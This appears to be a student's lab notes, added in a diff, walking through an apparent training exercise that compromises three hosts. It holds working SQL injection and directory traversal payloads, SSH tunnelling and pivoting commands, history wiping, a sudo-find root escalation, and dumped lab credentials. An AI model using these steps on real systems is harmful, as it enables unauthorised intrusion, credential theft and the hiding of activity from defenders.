@@ -1,1 +1,100 @@
-gsgdfgdgdg
+Leave Alone!!!
+10.10.X.X
+X.X.X.190
+
+TRWA-011-M 10.50.35.51 (Make this into a jump box)
+
+OP Notes
+
+----------------------------------------Jump Box/First Box---------------------------------------------------------
+
+nmap 10.50.35.51 -T4 -Pn -p 1-1000 
+ssh -MS /tmp/jump student@10.50.26.72
+ssh -S /tmp/jump jim -O forward -D 9050
+ssh -S /tmp/jump jim -O forward -L 1110:10.50.35.51:80
+ssh -S /tmp/jump jim -O forward -L 1111:10.50.35.51:22
+firefox&
+http://127.0.0.1:1110
+(In prompt)    ; ../../../../../../../etc/passwd   (Found usernames and users with shells)
+first thing to try in loggin screen is single quote '
+Truth statement:  ' OR 1='1    
+---It returns with the first user to make an account (Results: Aaron) This will be important---
+Inspect page after rersending truth statement, go to network tab, click on Get request, request tab, change to raw data, copy and paste into the url after: http://127.0.0.1:1110/login.php?<raw data> 
+Results are the usernames and passwords of 3 different users:
+	user2:RntyrfVfNER78
+	user3:Obo4GURRnccyrf
+	Lee_Roth:anotherpassword4THEages
+http://127.0.0.1:1110/robots.txt  (Does not work)
+proxychains nmap 10.50.35.51 --script http-enumerate -Pn -T4
+http://127.0.0.1:1110/scripts/
+discover though: nmap 10.50.35.51 --script http-enumerate -Pn -T4
+open development.py:  system_user=user2
+                      user_password=EaglesIsARE78
+This password shows that the other one was roth 13 encoded, so use cyberchef to unencrypt
+user2: RntyrfVfNER78  -> EaglesIsARE78
+user3: Obo4GURRnccyrf -> Bob4THEEapples
+
+
+
+
+------------------------------------------Second Box-------------------------------------------------------------------
+
+ssh -MS /tmp/yon user2@127.0.0.1 -p 1111         (PublicFacingWebsite)
+ssh -S /tmp/jump jim -O cancel -D 9050
+ssh -S /tmp/yon yon -O forward -D 9050
+bash
+unset HISTFILE
+sudo -l                                          (Not high enough permissions) 
+find / -type f -perm /6000 -ls 2>/dev/null       (Nothing useful)
+cat /etc/hosts                                   (IP: 192.168.28.181 Name:WebApp)
+ip a                                             (IP that is returned is not for us to use)
+ip route                                         (Nothing useful here)
+Search up bash ping sweep:    for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+Ip's returned: 192.168.28.172, 192.168.28.181, 192.168.28.190 (Don't touch this one) 
+proxychains nmap 192.168.28.181 -T4 -Pn -vvvv -p 1-9999
+Results: 22, 80
+proxychains nmap 192.168.28.172 -T4 -Pn -vvvv -p 1-9999
+Results: 22, 7008
+
+ssh -S /tmp/yon yon -O forward -L 1112:192.168.28.181:80
+
+
+
+
+firefox&                                                     (If firefox is acting up then do: killall firefox)
+http://127.0.0.1:1112/
+Make a Golden statement:
+http://127.0.0.1:1112/pick.php?product=7 OR 1=1              (It was 7 because it was the only one that gave a response)
+http://127.0.0.1:1112/pick.php?product=7 UNION SELECT 1,2,3  (The order is different than 1,2,3)
+http://127.0.0.1:1112/pick.php?product=7 UNION SELECT table_schema,column_name,table_name from information_schema.columns
+---Search for user made databases, only search other ones if specifically specified in instructions---
+For making it easier to read make sure the format looks like:           Database     Schema     Column
+Golden Statement:
+		union select user_id,username,name from siteusers.users
+In URL:	http://127.0.0.1:1112/pick.php?product=7 union select user_id,username,name from siteusers.users
+Results:
+	Item 	On Hand 	Price
+	HAM 	32 		$15
+	1 	Aaron 		$Aaron
+	2 	user2 		$user2
+	3 	user3 		$user3
+	4 	Lee_Roth 	$Lroth
+	1 	Aaron 		$ncnffjbeqlCn$$jbeq    -> apasswordyPa$$word
+	2 	user2 		$RntyrfVfNER78
+	3 	user3 		$Obo4GURRnccyrf
+	4 	Lroth 		$anotherpassword4THEages
+        (Note: The $ is not a part of the password)
+
+
+
+----------------------------------------------------------------------------Third Box-------------------------------------------------------------------------
+
+
+ssh -S /tmp/yon yon -O forward -L 1113:192.168.28.172:22
+ssh -MS /tmp/kun Aaron@127.0.0.1 -p 1113                              (Aaron was the only user that worked)
+bash
+unset HISTFILE
+Aaron can use sudo
+sudo find . -exec /bin/bash \; -quit           (Finish up this command on monday)
+whoami    
+Results: root
